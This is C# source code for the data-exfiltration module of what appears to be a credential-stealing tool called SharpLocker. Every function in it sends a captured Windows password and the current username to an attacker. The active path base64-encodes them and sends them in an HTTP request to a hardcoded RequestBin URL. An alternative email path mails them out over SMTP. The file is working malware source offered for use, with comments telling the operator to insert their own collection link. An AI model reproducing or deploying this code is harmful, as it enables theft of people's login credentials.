using System;
using System.Net;
using System.Net.Mail;
using System.Text;

namespace SharpLocker
{
    public static class DataExtractor
    {
        public static void Extract(string password)
        {
            //Extract with request bin
            ExtractWithRequastBin(password);

            //Extract with email
            //ExtractWithEmail(password);
        }

        static void ExtractWithRequastBin(string password)
        {
            //http://requestbin.net
            //RequestBin is a service that allows you to inspect requests.
            //We are going to use this to send a request with the password.
            //Creds to Seytonic

            //YOUR RequestBin link
            //format: http://requestbin.net/r/xxxxxxxx
            string url = "http://requestbin.net/r/rv6v9wrv";

            bool EncodeWithBase64 = true;
            bool IncludeUsername = true;

            //Don't touch this!
            string p = "";

            if (IncludeUsername)
            {
                string userNameText = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
                p = "Password:" + password + " Username:" + userNameText.Split('\\')[1];
            }
            else
            {
                p = password;
            }

            if (EncodeWithBase64)
            {
                var plainTextBytes = Encoding.UTF8.GetBytes(p);
                p = Convert.ToBase64String(plainTextBytes);
            }

            HttpWebRequest req = (HttpWebRequest)WebRequest.Create(url + "?" + p);
            req.GetResponse();

        }

        static void ExtractWithEmail(string password)
        {
            //This sends an email with the password and computer details.

            string e_pass = ""; //Password for the email
            string e_address = ""; //Address of the email
            string e_host_addr = ""; //Address of the email provider
            int e_host_port = 587; //Port for the email providers

            //Don't touch this!
            string body = "Password: " + password + " Username&Domain: " + System.Security.Principal.WindowsIdentity.GetCurrent().Name;

            MailMessage msg = new MailMessage(e_address, e_address, "Windwos Password on " + System.Security.Principal.WindowsIdentity.GetCurrent().Name, body);
            msg.IsBodyHtml = true;
            SmtpClient sc = new SmtpClient(e_host_addr, e_host_port);
            sc.UseDefaultCredentials = false;
            NetworkCredential cre = new NetworkCredential(e_address, e_pass);//your mail password
            sc.Credentials = cre;
            sc.EnableSsl = true;
            sc.Send(msg);
        }
    }
}
